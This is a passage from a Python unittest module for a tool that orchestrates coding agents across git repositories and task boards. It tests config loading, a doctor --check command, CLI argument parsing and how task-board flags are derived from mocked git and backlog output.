            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["worktreeRoot"], "@repo")
        by_name = {p["name"]: p for p in config["projects"]}
        self.assertIsNone(by_name["my-app"]["worktreeRoot"])  # no override -- follows the global "@repo"
        self.assertEqual(by_name["my-lib"]["worktreeRoot"], "/custom/my-lib-worktrees")  # override wins

    def test_normalize_agents_map_is_idempotent_on_its_own_output(self):
        raw_map = {"codex": {"cmd": ["codex"], "promptSuffix": "hi"}}
        once = server.normalize_agents_map(raw_map)
        twice = server.normalize_agents_map(once)
        self.assertEqual(once, twice)

    def test_load_config_normalizes_object_form_agents(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_obj.json"
        )
        raw = {
            "agents": {
                "claude": ["claude"],
                "codex": {
                    "cmd": ["codex", "exec"],
                    "promptSuffix": "Use the layout-reviewer subagent for review passes.",
                },
            },
            "projects": [{"name": "my-app", "path": "/repos/my-app"}],
        }
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)

        self.assertEqual(config["agents"]["claude"], {"cmd": ["claude"], "promptSuffix": None, "resumeCmd": None})
        self.assertEqual(
            config["agents"]["codex"],
            {
                "cmd": ["codex", "exec"],
                "promptSuffix": "Use the layout-reviewer subagent for review passes.",
                "resumeCmd": None,
            },
        )


class RunDoctorCheckZeroConfigTests(unittest.TestCase):
    """Hermetic tests for --check's config-related guidance (task-53): a
    missing projects.json reads as friendly first-run guidance (PASS,
    never FAIL/WARN) rather than a failure; a malformed file still fails
    loudly, unchanged; a present-but-empty config keeps its existing WARN
    wording, unchanged. Every external-tool check (git/backlog/tmux/
    bwrap) run_doctor_check makes is mocked via its own documented
    injectable boundaries, so this suite's result never depends on what's
    actually installed on the machine running it."""

    def setUp(self):
        self.which_patch = mock.patch.object(server, "which", return_value="/usr/bin/tool")
        self.which_patch.start()
        self.addCleanup(self.which_patch.stop)
        self.run_git_patch = mock.patch.object(
            server, "run_git", return_value=subprocess.CompletedProcess(["git"], 0, "git version 2.43.0", "")
        )
        self.run_git_patch.start()
        self.addCleanup(self.run_git_patch.stop)
        self.run_backlog_raw_patch = mock.patch.object(
            server, "run_backlog_raw", return_value=subprocess.CompletedProcess(["backlog"], 0, "1.50.1", "")
        )
        self.run_backlog_raw_patch.start()
        self.addCleanup(self.run_backlog_raw_patch.stop)
        self.bwrap_probe_patch = mock.patch.object(
            server, "run_bwrap_probe", return_value=subprocess.CompletedProcess(["bwrap"], 0, "", "")
        )
        self.bwrap_probe_patch.start()
        self.addCleanup(self.bwrap_probe_patch.stop)

    def test_missing_config_reports_friendly_first_run_guidance_and_exits_ok(self):
        lines, ok = server.run_doctor_check(config_path="/nonexistent/projects.json")
        self.assertTrue(ok)
        self.assertFalse(any(l.startswith("[FAIL]") for l in lines), lines)
        self.assertTrue(
            any(l.startswith("[PASS]") and "first run" in l for l in lines), lines
        )
        # Never the generic "0 projects configured" phrasing a present-
        # but-empty file would produce (see the empty-file test below).
        self.assertFalse(any("0 projects configured" in l for l in lines), lines)

    def test_malformed_config_still_fails_loudly(self):
        tmp_path = os.path.join(FIXTURES_DIR, "_tmp_doctor_bad_agents.json")
        raw = {"agents": {"claude": ["claude"], "bogus": {"cmd": "not-a-list"}}}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            lines, ok = server.run_doctor_check(config_path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertFalse(ok)
        self.assertTrue(any(l.startswith("[FAIL] projects.json failed to load") for l in lines), lines)

    def test_present_but_empty_projects_keeps_existing_warn_wording(self):
        tmp_path = os.path.join(FIXTURES_DIR, "_tmp_doctor_empty_projects.json")
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump({"projects": []}, f)
        try:
            lines, ok = server.run_doctor_check(config_path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertTrue(ok)
        self.assertTrue(any(l.startswith("[WARN] no projects configured") for l in lines), lines)
        self.assertFalse(any("first run" in l for l in lines), lines)

    def test_present_config_with_projects_is_unaffected(self):
        tmp_path = os.path.join(FIXTURES_DIR, "_tmp_doctor_with_projects.json")
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump({"projects": [{"name": "my-app", "path": "/nonexistent/my-app"}]}, f)
        try:
            lines, ok = server.run_doctor_check(config_path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertTrue(ok)
        self.assertTrue(any(l.startswith("[PASS] projects.json parses (1 project configured)") for l in lines), lines)
        self.assertFalse(any("first run" in l for l in lines), lines)


class BuildArgParserTests(unittest.TestCase):
    """Hermetic tests for server.py's CLI argument parsing (task-55):
    stdlib argparse replaced the old hand-rolled
    `if "--check" in sys.argv[1:]` string match, which silently ignored
    anything else on the command line -- a stranger's typo, or a guessed
    --port/--config flag that was never real (config is projects.json,
    deliberately not a CLI flag), would just run the server with
    defaults and no warning. Calling build_arg_parser().parse_args()
    directly never binds a port, installs a signal handler, or does
    anything else main() itself would -- same unit-level-over-subprocess
    convention RunDoctorCheckZeroConfigTests above already established
    for anything CLI-shaped in this module."""

    def test_bare_invocation_defaults_check_to_false(self):
        args = server.build_arg_parser().parse_args([])
        self.assertFalse(args.check)

    def test_check_flag_sets_check_true(self):
        args = server.build_arg_parser().parse_args(["--check"])
        self.assertTrue(args.check)

    def test_unknown_argument_exits_2_with_usage_and_error_on_stderr(self):
        parser = server.build_arg_parser()
        stderr = io.StringIO()
        with contextlib.redirect_stderr(stderr), self.assertRaises(SystemExit) as ctx:
            parser.parse_args(["--port", "8000"])
        self.assertEqual(ctx.exception.code, 2)
        self.assertIn("usage: server.py", stderr.getvalue())
        self.assertIn("unrecognized arguments", stderr.getvalue())

    def test_unknown_flag_typo_also_exits_2(self):
        parser = server.build_arg_parser()
        stderr = io.StringIO()
        with contextlib.redirect_stderr(stderr), self.assertRaises(SystemExit) as ctx:
            parser.parse_args(["--cheack"])
        self.assertEqual(ctx.exception.code, 2)


class MainCliDispatchTests(unittest.TestCase):
    """Hermetic tests that main() actually wires build_arg_parser()'s
    --check flag to run_doctor_check() with the right exit code, and
    that an unknown argument never falls through to any of main()'s
    other startup logic. run_doctor_check itself is mocked (its own
    external-tool boundaries are already covered by
    RunDoctorCheckZeroConfigTests) so none of this shells out, installs
    a signal handler, or binds a port -- main()'s bare-invocation
    happy path (server start/serve_forever) is untested here and
    elsewhere in this suite by design; it's exercised live, never via
    main() itself, by HttpApiTests and friends constructing
    CentraleHTTPServer directly."""

    # --check's whole output is the doctor report main() prints on
    # stdout, so both tests below capture it (task-106): left
    # uncaptured it escapes into the runner's output and, thanks to
    # stdout buffering, prints *after* unittest's "OK".

    def test_check_flag_calls_run_doctor_check_and_exits_with_its_ok(self):
        stdout = io.StringIO()
        with mock.patch.object(sys, "argv", ["server.py", "--check"]), \
             mock.patch.object(server, "run_doctor_check", return_value=(["[PASS] fake"], True)) as doctor:
            with contextlib.redirect_stdout(stdout), self.assertRaises(SystemExit) as ctx:
                server.main()
        doctor.assert_called_once_with()
        self.assertEqual(ctx.exception.code, 0)
        self.assertIn("[PASS] fake", stdout.getvalue())

    def test_check_flag_exits_1_when_doctor_reports_not_ok(self):
        stdout = io.StringIO()
        with mock.patch.object(sys, "argv", ["server.py", "--check"]), \
             mock.patch.object(server, "run_doctor_check", return_value=(["[FAIL] fake"], False)):
            with contextlib.redirect_stdout(stdout), self.assertRaises(SystemExit) as ctx:
                server.main()
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("[FAIL] fake", stdout.getvalue())

    def test_unknown_argument_exits_2_before_reaching_any_startup_logic(self):
        with mock.patch.object(sys, "argv", ["server.py", "--bogus"]), \
             mock.patch.object(server, "install_terminate_handlers") as install_handlers, \
             mock.patch.object(server, "run_doctor_check") as doctor:
            stderr = io.StringIO()
            with contextlib.redirect_stderr(stderr), self.assertRaises(SystemExit) as ctx:
                server.main()
        self.assertEqual(ctx.exception.code, 2)
        install_handlers.assert_not_called()
        doctor.assert_not_called()


class BoardAggregationTests(unittest.TestCase):
    def setUp(self):
        server._reset_board_cache()
        server._reset_agent_events()
        # Use a real, existing directory so the os.path.isdir guard passes;
        # the actual `backlog` calls are mocked below.
        self.my_app_dir = os.path.dirname(os.path.abspath(__file__))
        self.my_tool_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

    def tearDown(self):
        server._reset_board_cache()
        server._reset_agent_events()

    def _config(self):
        return make_config([
            {"name": "my-app", "path": self.my_app_dir},
            {"name": "my-tool", "path": self.my_tool_dir},
        ])

    def test_happy_path_aggregation_and_ready_merge(self):
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")
        my_tool_list = load_fixture("my_tool_list.json")
        my_tool_ready = load_fixture("my_tool_ready.json")

        def fake_run_backlog(args, cwd):
            if cwd == self.my_app_dir:
                if "--ready" in args:
                    return my_app_ready
                return my_app_list
            if cwd == self.my_tool_dir:
                if "--ready" in args:
                    return my_tool_ready
                return my_tool_list
            raise AssertionError(f"unexpected cwd {cwd}")

        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            board = server.get_board(self._config(), force=True)

        self.assertEqual(len(board["projects"]), 2)
        by_name = {p["name"]: p for p in board["projects"]}

        my_app = by_name["my-app"]
        self.assertIsNone(my_app["error"])
        self.assertEqual(len(my_app["tasks"]), 4)
        self.assertEqual(
            my_app["statuses"], ["To Do", "In Progress", "Done"]
        )

        my_tool = by_name["my-tool"]
        self.assertIsNone(my_tool["error"])
        self.assertEqual(len(my_tool["tasks"]), 2)

    def test_agent_state_defaults_to_unknown_and_reflects_recorded_events(self):
        # task-37: every task carries an "agentState" field, "unknown"
        # until its agent's hooks/notify (or a custom agent's own POST)
        # report otherwise -- recorded per (project, taskId), never per
        # tmux session, so it's visible here purely from get_board()
        # merging server.get_agent_state in, with nothing tmux-related
        # mocked at all.
        server.record_agent_event("my-app", "TASK-2", "finished", agent_kind="codex")

        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")

        def fake_run_backlog(args, cwd):
            return my_app_ready if "--ready" in args else my_app_list

        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            board = server.get_board(make_config([{"name": "my-app", "path": self.my_app_dir}]), force=True)

        tasks_by_id = {t["id"]: t for t in board["projects"][0]["tasks"]}
        self.assertEqual(tasks_by_id["TASK-2"]["agentState"], "idle")
        self.assertEqual(tasks_by_id["TASK-2"]["agentKind"], "codex")
        # Every other task in the fixture never had an event recorded.
        self.assertEqual(tasks_by_id["TASK-1"]["agentState"], "unknown")
        self.assertEqual(tasks_by_id["TASK-1"]["agentKind"], "unknown")
        self.assertEqual(tasks_by_id["TASK-3"]["agentState"], "unknown")

    def test_ready_flag_merging(self):
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")
        ready_ids = {t["id"] for t in my_app_ready["tasks"]}

        def fake_run_backlog(args, cwd):
            if "--ready" in args:
                return my_app_ready
            return my_app_list

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            board = server.get_board(config, force=True)

        tasks = board["projects"][0]["tasks"]
        self.assertEqual(len(tasks), 4)
        for task in tasks:
            expected_ready = task["id"] in ready_ids
            self.assertEqual(task["ready"], expected_ready, task["id"])
        # sanity: at least one ready and one not-ready task in the fixture
        self.assertTrue(any(t["ready"] for t in tasks))
        self.assertTrue(any(not t["ready"] for t in tasks))

    def test_has_spawn_branch_flag_set_from_one_for_each_ref_call_per_project(self):
        # main can say a task is still In Progress while its task/<id>
        # branch has already moved past that -- hasSpawnBranch is how the
        # frontend knows to offer the Merge button regardless of what
        # main's own status says (see harvest.py's gate 2 fix).
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")
        branches_proc = git_proc([], 0, "task/task-2\ntask/task-3\n", "")

        def fake_run_backlog(args, cwd):
            if "--ready" in args:
                return my_app_ready
            return my_app_list

        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", return_value=branches_proc) as run_git:
            config = make_config([{"name": "my-app", "path": self.my_app_dir}])
            board = server.get_board(config, force=True)

        by_id = {t["id"]: t for t in board["projects"][0]["tasks"]}
        self.assertTrue(by_id["TASK-2"]["hasSpawnBranch"])
        self.assertTrue(by_id["TASK-3"]["hasSpawnBranch"])
        self.assertFalse(by_id["TASK-1"]["hasSpawnBranch"])
        self.assertFalse(by_id["TASK-4"]["hasSpawnBranch"])
        # One for-each-ref call per ref namespace for the whole project,
        # not one per task: refs/heads/task for this flag, and (task-134)
        # refs/tags/abandoned for lastDiscardedAt.
        for_each_ref_calls = [c.args[0] for c in run_git.call_args_list if c.args[0][:1] == ["for-each-ref"]]
        self.assertEqual(len(for_each_ref_calls), 2)
        self.assertEqual(sorted(c[-1] for c in for_each_ref_calls),
                         ["refs/heads/task", "refs/tags/abandoned"])

    def test_has_spawn_branch_false_for_every_task_when_project_has_no_task_branches(self):
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")

        def fake_run_backlog(args, cwd):
            if "--ready" in args:
                return my_app_ready
            return my_app_list

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")):
            board = server.get_board(config, force=True)

        tasks = board["projects"][0]["tasks"]
        self.assertTrue(len(tasks) > 0)
        self.assertFalse(any(t["hasSpawnBranch"] for t in tasks))

    # -----------------------------------------------------------------
    # task-134: lastDiscardedAt, derived from the recovery tags
    # -----------------------------------------------------------------

    def _board_with_tags(self, tag_stdout, returncode=0, branches=""):
        """The board, with `git for-each-ref refs/tags/abandoned` answering
        `tag_stdout`/`returncode` and every other git call succeeding
        with nothing to say."""
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")

        def fake_run_backlog(args, cwd):
            if "--ready" in args:
                return my_app_ready
            return my_app_list

        def fake_run_git(args, cwd=None, **kwargs):
            if args[:1] == ["for-each-ref"] and args[-1] == "refs/tags/abandoned":
                return git_proc(args, returncode, tag_stdout, "")
            if args[:1] == ["for-each-ref"] and args[-1] == "refs/heads/task":
                return git_proc(args, 0, branches, "")
            return git_proc(args, 0, "", "")

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git):
            board = server.get_board(config, force=True)
        return {t["id"]: t for t in board["projects"][0]["tasks"]}

    def test_last_discarded_at_is_the_newest_recovery_tags_own_stamp(self):
        # Repeated discards of one task leave several tags; the confirm
        # is about the LAST attempt, so the newest stamp wins -- and the
        # time comes from the tag NAME (these are lightweight tags, so
        # git's own tag date is the discarded commit's date instead).
        by_id = self._board_with_tags(
            "abandoned/task-2-20260904-163012\n"
            "abandoned/task-2-20260905-090000\n"
            "abandoned/task-2-20260901-235959\n"
            "abandoned/task-3-20260830-071500\n")
        self.assertEqual(by_id["TASK-2"]["lastDiscardedAt"], "2026-09-05T09:00:00Z")
        self.assertEqual(by_id["TASK-3"]["lastDiscardedAt"], "2026-08-30T07:15:00Z")
        self.assertIsNone(by_id["TASK-1"]["lastDiscardedAt"])
        self.assertIsNone(by_id["TASK-4"]["lastDiscardedAt"])

    def test_last_discarded_at_is_none_on_every_task_when_the_repo_has_no_such_tags(self):
        by_id = self._board_with_tags("")
        self.assertTrue(len(by_id) > 0)
        for task_id, task in by_id.items():
            self.assertIn("lastDiscardedAt", task, task_id)
            self.assertIsNone(task["lastDiscardedAt"], task_id)

    def test_a_failing_tag_listing_leaves_the_field_present_and_null(self):
        # AC #5: a repository git can't read the tags of must look
        # exactly like one that has never had a discard -- no error
        # field, no missing key, no failed board.
        by_id = self._board_with_tags("fatal: not a git repository\n", returncode=128)
        for task_id, task in by_id.items():
            self.assertIsNone(task["lastDiscardedAt"], task_id)

    def test_tags_under_the_prefix_that_are_not_ours_are_ignored(self):
        # A hand-made tag under abandoned/ isn't a record of anything
        # Centrale did, and must not be read as one.
        by_id = self._board_with_tags(
            "abandoned/wip\n"
            "abandoned/task-2-lastweek\n"
            "abandoned/task-2-20260904-1630\n"
            "abandoned/task-3-20260904-163012\n")
        self.assertIsNone(by_id["TASK-2"]["lastDiscardedAt"])
        self.assertEqual(by_id["TASK-3"]["lastDiscardedAt"], "2026-09-04T16:30:12Z")

    def test_last_discarded_at_survives_the_task_having_a_branch_again(self):
        # The field is about the tags and nothing else: a task that was
        # discarded and then re-spawned carries both. The frontend guard,
        # not the server, decides that a branch means no discard copy.
        by_id = self._board_with_tags(
            "abandoned/task-2-20260904-163012\n", branches="task/task-2\n")
        self.assertTrue(by_id["TASK-2"]["hasSpawnBranch"])
        self.assertEqual(by_id["TASK-2"]["lastDiscardedAt"], "2026-09-04T16:30:12Z")

    def test_worktree_dirty_flag_set_from_git_status_in_each_branchs_own_worktree(self):
        # "Interrupted" detection (task-25): a task with a branch AND
        # uncommitted changes in its worktree -- distinct from a clean
        # branch that's simply awaiting merge.
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")
        dirty_wt = os.path.join("/tmp/does-not-matter", "my-app-task-2")
        clean_wt = os.path.join("/tmp/does-not-matter", "my-app-task-3")

        def fake_run_backlog(args, cwd):
            if "--ready" in args:
                return my_app_ready
            return my_app_list

        def fake_run_git(args, cwd=None):
            if args[:1] == ["for-each-ref"]:
                return git_proc(args, 0, "task/task-2\ntask/task-3\n", "")
            if args[:1] == ["status"]:
                dirty = cwd == dirty_wt
                return git_proc(args, 0, " M some_file.py\n" if dirty else "", "")
            return git_proc(args, 0, "", "")

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch("os.path.isdir", return_value=True):
            board = server.get_board(config, force=True)

        by_id = {t["id"]: t for t in board["projects"][0]["tasks"]}
        self.assertTrue(by_id["TASK-2"]["worktreeDirty"])
        self.assertFalse(by_id["TASK-3"]["worktreeDirty"])
        # No branch at all -- never even checked, defaults to false.
        self.assertFalse(by_id["TASK-1"]["worktreeDirty"])
        self.assertFalse(by_id["TASK-4"]["worktreeDirty"])

    def test_branch_checkout_classifies_external_centrale_and_parked(self):
        # task-70: one `git worktree list --porcelain` per project tells
        # where each task/<id> branch is checked out. TASK-2 was adopted
        # into a foreign worktree (external, with the branch's last-commit
        # age), TASK-3 sits in Centrale's own worktree, TASK-4's branch
        # exists but is checked out nowhere (parked), TASK-1 has no branch.
        import spawn

        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")
        foreign = os.path.join(self.my_app_dir, ".worktrees", "task-2-integrated")
        centrale_wt = os.path.join("/tmp/does-not-matter", "my-app-task-3")
        porcelain = (
            f"worktree {self.my_app_dir}\nHEAD aaa\nbranch refs/heads/main\n\n"
            f"worktree {foreign}\nHEAD bbb\nbranch refs/heads/task/task-2\n\n"
            f"worktree {centrale_wt}\nHEAD ccc\nbranch refs/heads/task/task-3\n"
        )

        def fake_run_backlog(args, cwd):
            if "--ready" in args:
                return my_app_ready
            return my_app_list

        def fake_run_git(args, cwd=None):
            if args[:1] == ["for-each-ref"]:
                return git_proc(args, 0, "task/task-2\ntask/task-3\ntask/task-4\n", "")
            if args[:2] == ["worktree", "list"]:
                return git_proc(args, 0, porcelain, "")
            if args[:1] == ["log"]:
                return git_proc(args, 0, "1700000000\n", "")
            return git_proc(args, 0, "", "")

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git) as run_git, \
             mock.patch.object(spawn, "_now", return_value=1700007200), \
             mock.patch("os.path.isdir", return_value=True):
            board = server.get_board(config, force=True)

        by_id = {t["id"]: t for t in board["projects"][0]["tasks"]}
        self.assertEqual(by_id["TASK-2"]["branchCheckout"], {
            "kind": "external",
            "path": foreign,
            "lastCommitAt": "2023-11-14T22:13:20Z",
            "lastCommitAgeSeconds": 7200,
        })
        self.assertEqual(by_id["TASK-3"]["branchCheckout"], {"kind": "centrale", "path": centrale_wt})
        self.assertEqual(by_id["TASK-4"]["branchCheckout"], {"kind": "none", "path": None})
        self.assertIsNone(by_id["TASK-1"]["branchCheckout"])
        # Cost discipline: one worktree listing for the whole project, and
        # the last-commit lookup only for the external branch.
        calls = [c.args[0] for c in run_git.call_args_list]
        self.assertEqual(sum(1 for a in calls if a[:2] == ["worktree", "list"]), 1)
        self.assertEqual([a for a in calls if a[:1] == ["log"]], [["log", "-1", "--format=%ct", "task/task-2"]])

    def test_branch_checkout_skips_worktree_listing_when_project_has_no_branches(self):
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")

        def fake_run_backlog(args, cwd):
            if "--ready" in args:
                return my_app_ready
            return my_app_list

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", return_value=git_proc([], 0, "", "")) as run_git:
            board = server.get_board(config, force=True)

        self.assertTrue(all(t["branchCheckout"] is None for t in board["projects"][0]["tasks"]))
        self.assertFalse(any(c.args[0][:2] == ["worktree", "list"] for c in run_git.call_args_list))

    def test_worktree_dirty_false_when_worktree_directory_is_missing(self):
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")

        def fake_run_backlog(args, cwd):
            if "--ready" in args:
                return my_app_ready
            return my_app_list

        def fake_run_git(args, cwd=None):
            if args[:1] == ["for-each-ref"]:
                return git_proc(args, 0, "task/task-2\n", "")
            return git_proc(args, 0, "", "")

        # True for the real project path (so board loading itself
        # proceeds), False for everything else -- specifically the
        # task's worktree dir, which is the case under test here.
        def fake_isdir(path):
            return path == self.my_app_dir

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch("os.path.isdir", side_effect=fake_isdir):
            board = server.get_board(config, force=True)

        by_id = {t["id"]: t for t in board["projects"][0]["tasks"]}
        self.assertTrue(by_id["TASK-2"]["hasSpawnBranch"])
        self.assertFalse(by_id["TASK-2"]["worktreeDirty"])

    def test_already_merged_true_only_when_ancestor_and_status_done(self):
        # task-43 (the TASK-1 incident in another repo): a branch merged entirely
        # out-of-band -- not through Centrale's own harvest -- must still
        # be detected. task-45 (that repo's TASK-2/TASK-3 finding): ancestry
        # ALONE is not enough -- a freshly spawned branch's only commit
        # is the claim commit, already on main, so it's trivially an
        # ancestor while still In Progress. my_app_list.json's fixture
        # statuses happen to reproduce exactly that shape: TASK-2 is In
        # Progress, TASK-3 is Done -- both made ancestors here, so only
        # TASK-3 (ancestor AND Done) should read as alreadyMerged.
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")

        def fake_run_backlog(args, cwd):
            return my_app_ready if "--ready" in args else my_app_list

        def fake_run_git(args, cwd=None):
            if args[:1] == ["for-each-ref"]:
                return git_proc(args, 0, "task/task-2\ntask/task-3\n", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                return git_proc(args, 0, "", "")  # both branches are ancestors
            return git_proc(args, 0, "", "")

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git):
            board = server.get_board(config, force=True)

        by_id = {t["id"]: t for t in board["projects"][0]["tasks"]}
        self.assertEqual(by_id["TASK-2"]["status"], "In Progress")
        self.assertFalse(by_id["TASK-2"]["alreadyMerged"])  # ancestor, but not Done
        self.assertEqual(by_id["TASK-3"]["status"], "Done")
        self.assertTrue(by_id["TASK-3"]["alreadyMerged"])  # ancestor AND Done
        # No branch at all -- never even checked, defaults to false.
        self.assertFalse(by_id["TASK-1"]["alreadyMerged"])
        self.assertFalse(by_id["TASK-4"]["alreadyMerged"])

    def test_already_merged_done_compared_case_insensitively(self):
        # Review nit on task-45: spawn._check_not_done (task-41) matches
        # "done" case-insensitively -- _branch_already_merged must use the
        # exact same comparison, or a repo with custom-cased statuses
        # would make the two features disagree about what "Done" means.
        my_app_list = json.loads(json.dumps(load_fixture("my_app_list.json")))
        my_app_ready = load_fixture("my_app_ready.json")
        by_fixture_id = {t["id"]: t for t in my_app_list["tasks"]}
        by_fixture_id["TASK-2"]["status"] = "done"   # lowercase
        by_fixture_id["TASK-3"]["status"] = "DONE"   # uppercase
        by_fixture_id["TASK-1"]["status"] = None     # missing/unknown status

        def fake_run_backlog(args, cwd):
            return my_app_ready if "--ready" in args else my_app_list

        def fake_run_git(args, cwd=None):
            if args[:1] == ["for-each-ref"]:
                return git_proc(args, 0, "task/task-1\ntask/task-2\ntask/task-3\n", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                return git_proc(args, 0, "", "")  # every branch is an ancestor
            return git_proc(args, 0, "", "")

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git):
            board = server.get_board(config, force=True)

        by_id = {t["id"]: t for t in board["projects"][0]["tasks"]}
        self.assertTrue(by_id["TASK-2"]["alreadyMerged"])   # "done" counts
        self.assertTrue(by_id["TASK-3"]["alreadyMerged"])   # "DONE" counts
        self.assertFalse(by_id["TASK-1"]["alreadyMerged"])  # None status fails safe

    def test_already_merged_false_when_status_done_but_not_an_ancestor(self):
        # The Done side alone isn't enough either -- a real unmerged
        # branch on a task someone (wrongly) marked Done early must not
        # read as already merged.
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")

        def fake_run_backlog(args, cwd):
            return my_app_ready if "--ready" in args else my_app_list

        def fake_run_git(args, cwd=None):
            if args[:1] == ["for-each-ref"]:
                return git_proc(args, 0, "task/task-3\n", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                return git_proc(args, 1, "", "")  # not an ancestor
            return git_proc(args, 0, "", "")

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git):
            board = server.get_board(config, force=True)

        by_id = {t["id"]: t for t in board["projects"][0]["tasks"]}
        self.assertEqual(by_id["TASK-3"]["status"], "Done")
        self.assertFalse(by_id["TASK-3"]["alreadyMerged"])

    def test_already_merged_skips_the_git_call_entirely_when_not_done(self):
        # Cost discipline (task-45): task_status is checked first, so the
        # merge-base ancestry call is never even made for a task that
        # isn't Done -- TASK-2 (In Progress) here.
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")

        def fake_run_backlog(args, cwd):
            return my_app_ready if "--ready" in args else my_app_list

        def fake_run_git(args, cwd=None):
            if args[:1] == ["for-each-ref"]:
                return git_proc(args, 0, "task/task-2\n", "")
            if args[:1] == ["merge-base"]:
                raise AssertionError("merge-base must not run for a non-Done task")
            return git_proc(args, 0, "", "")

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git):
            board = server.get_board(config, force=True)

        by_id = {t["id"]: t for t in board["projects"][0]["tasks"]}
        self.assertFalse(by_id["TASK-2"]["alreadyMerged"])

    def test_already_merged_false_on_git_failure_fail_safe(self):
        # Any git failure other than a clean "not an ancestor" (returncode
        # 1) must never read as merged -- the Merge button must never
        # silently vanish for a task that still genuinely needs one.
        # Uses TASK-3 (Done) so the merge-base call is actually reached.
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")

        def fake_run_backlog(args, cwd):
            return my_app_ready if "--ready" in args else my_app_list

        def fake_run_git(args, cwd=None):
            if args[:1] == ["for-each-ref"]:
                return git_proc(args, 0, "task/task-3\n", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                return git_proc(args, 128, "", "fatal: not a valid object name")
            return git_proc(args, 0, "", "")

        config = make_config([{"name": "my-app", "path": self.my_app_dir}])
        with mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git):
            board = server.get_board(config, force=True)

        by_id = {t["id"]: t for t in board["projects"][0]["tasks"]}
        self.assertFalse(by_id["TASK-3"]["alreadyMerged"])

    def test_per_project_failure_isolation(self):
        my_app_list = load_fixture("my_app_list.json")
        my_app_ready = load_fixture("my_app_ready.json")

        def fake_run_backlog(args, cwd):
            if cwd == self.my_tool_dir:
                raise server.BacklogError("backlog: command failed: boom")
            if "--ready" in args:
                return my_app_ready
            return my_app_list

